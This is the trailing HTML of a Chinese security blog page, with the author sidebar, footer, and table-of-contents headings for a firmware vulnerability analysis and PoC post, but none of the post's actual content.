href="/2024/09/06/%E4%BF%AE%E6%94%B9stack-check-fail%E7%9A%84got%E8%A1%A8/" title="修改stack_check_fail的got表"><img class="cover" src="/img/butterfly.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-06</div><div class="title">修改stack_check_fail的got表</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"></div><div class="author-info__name">Ya0rk</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">24</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">29</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Ya0rk/Ya0rk.github.io"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%BA%E4%BB%B6%E8%8E%B7%E5%8F%96"><span class="toc-number">1.</span> <span class="toc-text">固件获取</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E6%9C%9F%E5%A4%84%E7%90%86"><span class="toc-number">2.1.</span> <span class="toc-text">前期处理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9A%E4%BD%8D%E6%BC%8F%E6%B4%9E%E5%87%BD%E6%95%B0"><span class="toc-number">2.2.</span> <span class="toc-text">定位漏洞函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">2.3.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-number">2.4.</span> <span class="toc-text">利用思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#qemu%E7%94%A8%E6%88%B7%E7%BA%A7%E8%B0%83%E8%AF%95"><span class="toc-number">2.5.</span> <span class="toc-text">qemu用户级调试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#qemu%E7%B3%BB%E7%BB%9F%E7%BA%A7%E6%A8%A1%E6%8B%9F"><span class="toc-number">2.6.</span> <span class="toc-text">qemu系统级模拟</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#poc"><span class="toc-number">2.7.</span> <span class="toc-text">poc</span></a></li></ol></li></ol></div></div></div></div></main><footer id="footer" style="background: transparent"><div id="footer-wrap"><div class="copyright">©2020 - 2024 By Ya0rk</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async="" data-pjax="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
